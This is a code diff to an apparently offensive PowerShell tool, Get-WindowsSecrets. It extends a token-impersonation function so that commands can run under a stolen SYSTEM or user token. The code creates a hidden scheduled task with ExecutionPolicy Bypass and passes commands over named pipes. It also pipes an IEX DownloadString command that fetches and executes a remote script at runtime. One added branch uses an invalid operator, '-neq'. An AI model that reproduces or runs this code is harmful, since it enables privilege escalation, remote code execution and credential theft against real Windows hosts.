@@ -5758,7 +5758,7 @@ function ListSessionTokens
 	return
 }
 
-function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe)
+function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $ImpersonateCommand)
 {
 	If ((-not $ProcID) -or (-not $Method))
 	{
@@ -5833,6 +5833,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe)
 
 			If ($Method -eq "ImpersonateLoggedOnUser")
 			{
+				Write-Host ("[-] Using ImpersonateLoggedOnUser() method: New procs/threads will use calling process token")
 				$Succeeded = [TokensAPI]::ImpersonateLoggedOnUser($DupToken)
 				If (-not $Succeeded)
 				{
@@ -5911,38 +5912,54 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe)
 						$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoExit -ExecutionPolicy Bypass -WindowStyle Hidden -Command $StartNamedPipes"
 						$MyTask = Register-ScheduledTask -TaskName $TaskName -User $User -Action $Action -RunLevel Highest -Force
 						Start-ScheduledTask $TaskName
-						
-						Write-Host ("[+] Ask new System process to impersonate token and create Token Named Pipes" -f ($ProcID))						
+												
 						$systemPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','systemPipeIn','Out'
 						$systemPipeIn.Connect()
 						$systemWriter = New-Object System.IO.StreamWriter($systemPipeIn)
+						Write-Host ("[+] Connected to System Named Pipes")
+						Write-Host ("[+] Ask new System process to impersonate token and create Token Named Pipes" -f ($ProcID))
 						
 						$Command = 'IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/YRazafim/Get-WindowsSecrets/main/Get-WindowsSecrets.ps1")'
 						$systemWriter.WriteLine($Command)
 						$systemWriter.Flush()
 						
-						$Command = "ImpersonateToken -ProcID $ProcID -Method CreateProcessAsUser -IsSystem 'True' -ConnectTokenPipe 'False'"
+						$Command = "ImpersonateToken -ProcID $ProcID -Method CreateProcessAsUser -IsSystem 'True' -ConnectTokenPipe 'False' -ImpersonateCommand 'Null'"
 						$systemWriter.WriteLine($Command)
 						$systemWriter.Flush()
 						
-						Write-Host ("[+] Connect to Token Named Pipes. Wait for System process ..." -f ($ProcID))
+						Write-Host ("[+] Connect to Token Named Pipes" -f ($ProcID))
 						
 						$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
 						$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
 						$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
 						$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
 						$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
-						While ($True)
+						If ($ImpersonateCommand -eq 'Null')
 						{
-							$Command = Read-Host -Prompt '$PS>'
-							If (($Command -eq "Exit") -or ($Command -eq "exit"))
+							While ($True)
 							{
+								$Command = Read-Host -Prompt '$PS>'
+								If (($Command -eq "Exit") -or ($Command -eq "exit"))
+								{
+									$tokenWriter.WriteLine($Command)
+									$tokenWriter.Flush()
+									Break
+								}
+
 								$tokenWriter.WriteLine($Command)
 								$tokenWriter.Flush()
-								Break
+								$res = $tokenReader.ReadLine()
+								If ($res)
+								{
+									$out = $res.Replace("||||||", "`n")
+									Write-Host ($out)
+								}
 							}
-
-							$tokenWriter.WriteLine($Command)
+						}
+						Else
+						{
+							Write-Host ("[+] Executing command")
+							$tokenWriter.WriteLine($ImpersonateCommand)
 							$tokenWriter.Flush()
 							$res = $tokenReader.ReadLine()
 							If ($res)
@@ -5951,6 +5968,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe)
 								Write-Host ($out)
 							}
 						}
+						
 						$tokenReader.Close()
 						$tokenWriter.Close()
 						$tokenPipeIn.Close()
@@ -6030,29 +6048,54 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe)
 								$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
 								$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
 								$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
-								$reader = New-Object System.IO.StreamReader($tokenPipeOut)
-								$writer = New-Object System.IO.StreamWriter($tokenPipeIn)
+								$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
+								$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
+								
 								While ($True)
 								{
 									$Command = Read-Host -Prompt '$PS>'
 									If (($Command -eq "Exit") -or ($Command -eq "exit"))
 									{
-										$writer.WriteLine($Command)
-										$writer.Flush()
+										$tokenWriter.WriteLine($Command)
+										$tokenWriter.Flush()
 										Break
 									}
 
-									$writer.WriteLine($Command)
-									$writer.Flush()
-									$res = $reader.ReadLine()
+									$tokenWriter.WriteLine($Command)
+									$tokenWriter.Flush()
+									$res = $tokenReader.ReadLine()
 									If ($res)
 									{
 										$out = $res.Replace("||||||", "`n")
 										Write-Host ($out)
 									}
 								}
-								$reader.Close()
-								$writer.Close()
+								
+								$tokenReader.Close()
+								$tokenWriter.Close()
+								$tokenPipeIn.Close()
+								$tokenPipeOut.Close()
+							}
+							ElseIf ($ImpersonateCommand -neq 'Null')
+							{
+								$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
+								$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
+								$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
+								$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
+								$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
+								
+								Write-Host ("[+] Executing command")
+								$tokenWriter.WriteLine($ImpersonateCommand)
+								$tokenWriter.Flush()
+								$res = $tokenReader.ReadLine()
+								If ($res)
+								{
+									$out = $res.Replace("||||||", "`n")
+									Write-Host ($out)
+								}
+								
+								$tokenReader.Close()
+								$tokenWriter.Close()
 								$tokenPipeIn.Close()
 								$tokenPipeOut.Close()
 							}
@@ -10527,7 +10570,8 @@ function Get-WindowsSecrets()
 		[Parameter(Mandatory=$False)][String]$ImpersonateTokenProcID, # Format = <ProcID>
 		[Parameter(Mandatory=$False)][String]$ImpersonateMethod, # Possible values = "ImpersonateLoggedOnUser" | "CreateProcessWithToken" | "CreateProcessAsUser"
 		[Parameter(Mandatory=$False)][String]$ImpersonateIsSystem, # Format = "True"/"False",
-		[Parameter(Mandatory=$False)][String]$ImpersonateConnectTokenPipe # Format = "True"/"False"
+		[Parameter(Mandatory=$False)][String]$ImpersonateConnectTokenPipe, # Format = "True"/"False"
+		[Parameter(Mandatory=$False)][String]$ImpersonateCommand # Format = "Null"/<CmdToExecute>
 		)
 
 	# Check administrator privileges, otherwise exit
@@ -10541,7 +10585,7 @@ function Get-WindowsSecrets()
 	If ($ImpersonateTokenProcID)
 	{
 		
-		ImpersonateToken -ProcID $ImpersonateTokenProcID -Method $ImpersonateMethod -IsSystem $ImpersonateIsSystem -ConnectTokenPipe $ImpersonateConnectTokenPipe
+		ImpersonateToken -ProcID $ImpersonateTokenProcID -Method $ImpersonateMethod -IsSystem $ImpersonateIsSystem -ConnectTokenPipe $ImpersonateConnectTokenPipe -ImpersonateCommand $ImpersonateCommand
 		return
 	}
 
